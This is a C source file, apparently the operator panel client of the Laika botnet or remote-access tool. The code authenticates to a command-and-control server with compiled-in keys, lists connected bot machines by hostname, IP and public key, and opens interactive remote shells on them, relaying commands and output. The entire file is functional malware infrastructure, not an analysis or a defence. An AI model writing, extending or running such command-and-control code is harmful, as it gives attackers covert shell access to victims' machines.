#include "lmem.h"
#include "lerror.h"
#include "lpacket.h"
#include "lsodium.h"
#include "sterm.h"

#include "sclient.h"

typedef struct sShell_hashMapElem {
    int id;
    tShell_peer *peer;
    uint8_t *pub;
} tShell_hashMapElem;

int shell_ElemCompare(const void *a, const void *b, void *udata) {
    const tShell_hashMapElem *ua = a;
    const tShell_hashMapElem *ub = b;

    return memcmp(ua->pub, ub->pub, crypto_kx_PUBLICKEYBYTES); 
}

uint64_t shell_ElemHash(const void *item, uint64_t seed0, uint64_t seed1) {
    const tShell_hashMapElem *u = item;
    return *(uint64_t*)(u->pub); /* hashes pub key (first 8 bytes) */
}

void shellC_handleHandshakeRes(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    uint8_t endianness = laikaS_readByte(&peer->sock);
    peer->sock.flipEndian = endianness != laikaS_isBigEndian();
}

void shellC_handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    char hostname[LAIKA_HOSTNAME_LEN], ipv4[LAIKA_IPV4_LEN];
    uint8_t pubKey[crypto_kx_PUBLICKEYBYTES];
    tShell_client *client = (tShell_client*)uData;
    tShell_peer *bot;
    uint8_t type;

    /* read newly connected peer's pubKey */
    laikaS_read(&peer->sock, pubKey, crypto_kx_PUBLICKEYBYTES);

    /* read hostname & ipv4 */
    laikaS_read(&peer->sock, hostname, LAIKA_HOSTNAME_LEN);
    laikaS_read(&peer->sock, ipv4, LAIKA_IPV4_LEN);

    /* read peer's peerType */
    type = laikaS_readByte(&peer->sock);

    /* ignore panel clients */
    if (type == PEER_AUTH)
        return;

    /* create peer */
    bot = shellP_newPeer(type, pubKey, hostname, ipv4);

    /* add peer to client */
    shellC_addPeer(client, bot);
}

void shellC_handleRmvPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    uint8_t pubKey[crypto_kx_PUBLICKEYBYTES];
    tShell_client *client = (tShell_client*)uData;
    tShell_peer *bot;
    uint8_t type;
    int id;

    /* read public key & type */
    laikaS_read(&peer->sock, pubKey, crypto_kx_PUBLICKEYBYTES);
    type = laikaS_readByte(&peer->sock);

    /* ignore panel clients */
    if (type == PEER_AUTH)
        return;

    if ((bot = shellC_getPeerByPub(client, pubKey, &id)) == NULL)
        LAIKA_ERROR("LAIKAPKT_AUTHENTICATED_RMV_PEER_RES: Unknown peer!\n");

    /* remove peer */
    shellC_rmvPeer(client, bot, id);
}

void shellC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    uint8_t buf[LAIKA_SHELL_DATA_MAX_LENGTH];
    tShell_client *client = (tShell_client*)uData;

    /* sanity check */
    if (!shellC_isShellOpen(client))
        LAIKA_ERROR("LAIKAPKT_AUTHENTICATED_SHELL_DATA: No shell open!\n");

    laikaS_read(&peer->sock, buf, sz);
    shellT_writeRawOutput(buf, sz);
}

void shellC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    tShell_client *client = (tShell_client*)uData;
    
    /* sanity check */
    if (!shellC_isShellOpen(client))
        LAIKA_ERROR("LAIKAPKT_AUTHENTICATED_SHELL_DATA: No shell open!\n");

    /* close shell */
    shellC_closeShell(client);
}

struct sLaika_peerPacketInfo shellC_pktTbl[LAIKAPKT_MAXNONE] = {
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_HANDSHAKE_RES,
        shellC_handleHandshakeRes,
        sizeof(uint8_t),
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_ADD_PEER_RES,
        shellC_handleAddPeer,
        crypto_kx_PUBLICKEYBYTES + LAIKA_HOSTNAME_LEN + LAIKA_IPV4_LEN + sizeof(uint8_t),
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_RMV_PEER_RES,
        shellC_handleRmvPeer,
        crypto_kx_PUBLICKEYBYTES + sizeof(uint8_t),
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_SHELL_DATA,
        shellC_handleShellData,
        0,
    true),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_SHELL_CLOSE,
        shellC_handleShellClose,
        0,
    false),
};

void shellC_init(tShell_client *client) {
    size_t _unused;

    laikaP_initPList(&client->pList);
    client->peer = laikaS_newPeer(
        shellC_pktTbl,
        &client->pList,
        (void*)client
    );

    client->peers = hashmap_new(sizeof(tShell_hashMapElem), 8, 0, 0, shell_ElemHash, shell_ElemCompare, NULL, NULL);
    client->openShell = NULL;
    client->peerTbl = NULL;
    client->peerTblCap = 4;
    client->peerTblCount = 0;

    /* load authenticated keypair */
    if (sodium_init() < 0) {
        shellC_cleanup(client);
        LAIKA_ERROR("LibSodium failed to initialize!\n");
    }

    if (sodium_hex2bin(client->pub, crypto_kx_PUBLICKEYBYTES, LAIKA_PUBKEY, strlen(LAIKA_PUBKEY), NULL, &_unused, NULL) != 0) {
        shellC_cleanup(client);
        LAIKA_ERROR("Failed to init public key!\n");
    }

    if (sodium_hex2bin(client->priv, crypto_kx_SECRETKEYBYTES, LAIKA_PRIVKEY, strlen(LAIKA_PRIVKEY), NULL, &_unused, NULL) != 0) {
        shellC_cleanup(client);
        LAIKA_ERROR("Failed to init private key!\n");
    }

    /* read cnc's public key into peerPub */
    if (sodium_hex2bin(client->peer->peerPub, crypto_kx_PUBLICKEYBYTES, LAIKA_PUBKEY, strlen(LAIKA_PUBKEY), NULL, &_unused, NULL) != 0) {
        shellC_cleanup(client);
        LAIKA_ERROR("Failed to init cnc public key!\n");
    }
}

void shellC_cleanup(tShell_client *client) {
    int i;

    laikaS_freePeer(client->peer);
    laikaP_cleanPList(&client->pList);
    hashmap_free(client->peers);

    /* free peers */
    for (i = 0; i < client->peerTblCount; i++) {
        if (client->peerTbl[i])
            shellP_freePeer(client->peerTbl[i]);
    }
    laikaM_free(client->peerTbl);
}

void shellC_connectToCNC(tShell_client *client, char *ip, char *port) {
    struct sLaika_socket *sock = &client->peer->sock;

    /* create encryption keys */
    if (crypto_kx_client_session_keys(client->peer->inKey, client->peer->outKey, client->pub, client->priv, client->peer->peerPub) != 0)
        LAIKA_ERROR("failed to gen session key!\n");

    /* setup socket */
    laikaS_connect(sock, ip, port);
    laikaS_setNonBlock(sock);
    laikaP_addSock(&client->pList, sock);

    /* queue handshake request */
    laikaS_startOutPacket(client->peer, LAIKAPKT_HANDSHAKE_REQ);
    laikaS_write(sock, LAIKA_MAGIC, LAIKA_MAGICLEN);
    laikaS_writeByte(sock, LAIKA_VERSION_MAJOR);
    laikaS_writeByte(sock, LAIKA_VERSION_MINOR);
    laikaS_write(sock, client->pub, sizeof(client->pub)); /* write public key */

    /* write stub hostname & ipv4 (since we're a panel/dummy client, cnc doesn't need this information really) */
    laikaS_zeroWrite(sock, LAIKA_HOSTNAME_LEN);
    laikaS_zeroWrite(sock, LAIKA_IPV4_LEN);
    laikaS_endOutPacket(client->peer);
    laikaS_setSecure(client->peer, true); /* after our handshake, all packet bodies are encrypted */

    /* queue authenticated handshake request */
    laikaS_startOutPacket(client->peer, LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ);
    laikaS_writeByte(sock, PEER_AUTH);
    laikaS_endOutPacket(client->peer);

    /* the handshake requests will be sent on the next call to shellC_poll */
}

void shellC_flushQueue(tShell_client *client) {
    /* flush pList's outQueue */
    if (client->pList.outCount > 0) {
        if (!laikaS_handlePeerOut(client->peer))
            laikaS_kill(&client->peer->sock);

        laikaP_resetOutQueue(&client->pList);
    }
}

bool shellC_poll(tShell_client *client, int timeout) {
    struct sLaika_pollEvent *evnt;
    int numEvents;

    /* flush any events prior (eg. made by a command handler) */
    shellC_flushQueue(client);
    evnt = laikaP_poll(&client->pList, timeout, &numEvents);

    if (numEvents == 0) /* no events? timeout was reached */
        return false;

LAIKA_TRY
    if (evnt->pollIn && !laikaS_handlePeerIn(client->peer))
        goto _CLIENTKILL;

    if (evnt->pollOut && !laikaS_handlePeerOut(client->peer))
        goto _CLIENTKILL;

    if (!evnt->pollIn && !evnt->pollOut) /* not a pollin or pollout event, must be an error */
        goto _CLIENTKILL;
LAIKA_CATCH
_CLIENTKILL:
    laikaS_kill(&client->peer->sock);
LAIKA_TRYEND

    /* flush any events after (eg. made by a packet handler) */
    shellC_flushQueue(client);
    return true;
}

tShell_peer *shellC_getPeerByPub(tShell_client *client, uint8_t *pub, int *id) {
    tShell_hashMapElem *elem = (tShell_hashMapElem*)hashmap_get(client->peers, &(tShell_hashMapElem){.pub = pub});

    /* return peer if elem was found, otherwise return NULL */
    if (elem) {
        *id = elem->id;
        return elem->peer;
    } else {
        *id = -1;
        return NULL;
    }
}

int shellC_addPeer(tShell_client *client, tShell_peer *newPeer) {
    /* find empty ID */
    int id;
    for (id = 0; id < client->peerTblCount; id++) {
        if (client->peerTbl[id] == NULL) /* it's empty! */
            break;
    }

    /* if we didn't find an empty id, grow the array */
    if (id == client->peerTblCount) {
        laikaM_growarray(tShell_peer*, client->peerTbl, 1, client->peerTblCount, client->peerTblCap);
        client->peerTblCount++;
    }

    /* add to peer lookup table */
    client->peerTbl[id] = newPeer;

    /* insert into hashmap */
    hashmap_set(client->peers, &(tShell_hashMapElem){.id = id, .pub = newPeer->pub, .peer = newPeer});

    /* let user know */
    if (!shellC_isShellOpen(client)) {
        shellT_printf("\nNew peer connected to CNC:\n");
        shellC_printInfo(newPeer);
    }
    return id;
}

void shellC_rmvPeer(tShell_client *client, tShell_peer *oldPeer, int id) {
    /* remove from bot tbl */
    client->peerTbl[id] = NULL;

    /* remove peer from hashmap */
    hashmap_delete(client->peers, &(tShell_hashMapElem){.pub = oldPeer->pub, .peer = oldPeer});

    if (!shellC_isShellOpen(client)) {
        shellT_printf("\nPeer disconnected from CNC:\n");
        shellC_printInfo(oldPeer);
    }

    /* finally, free peer */
    shellP_freePeer(oldPeer);
}

void shellC_openShell(tShell_client *client, tShell_peer *peer) {
    /* check if we already have a shell open */
    if (client->openShell)
        return;

    /* send SHELL_OPEN request */
    laikaS_startOutPacket(client->peer, LAIKAPKT_AUTHENTICATED_SHELL_OPEN_REQ);
    laikaS_write(&client->peer->sock, peer->pub, sizeof(peer->pub));
    laikaS_endOutPacket(client->peer);
    client->openShell = peer;
}

void shellC_closeShell(tShell_client *client) {
    /* check if we have a shell open */
    if (!shellC_isShellOpen(client))
        return;

    /* send SHELL_CLOSE request */
    laikaS_emptyOutPacket(client->peer, LAIKAPKT_AUTHENTICATED_SHELL_CLOSE);
    client->openShell = NULL;
}

void shellC_sendDataShell(tShell_client *client, uint8_t *data, size_t sz) {
    /* check if we have a shell open */
    if (!shellC_isShellOpen(client))
        return;

    laikaS_startVarPacket(client->peer, LAIKAPKT_AUTHENTICATED_SHELL_DATA);
    laikaS_write(&client->peer->sock, data, sz);
    laikaS_endVarPacket(client->peer);
}

void shellC_printInfo(tShell_peer *peer) {
    char buf[128];

    sodium_bin2hex(buf, sizeof(buf), peer->pub, crypto_kx_PUBLICKEYBYTES);
    shellT_printf("\t%s@%s\n\tTYPE: %s\n\tPUBKEY: %s\n", peer->hostname, peer->ipv4, shellP_typeStr(peer), buf);
}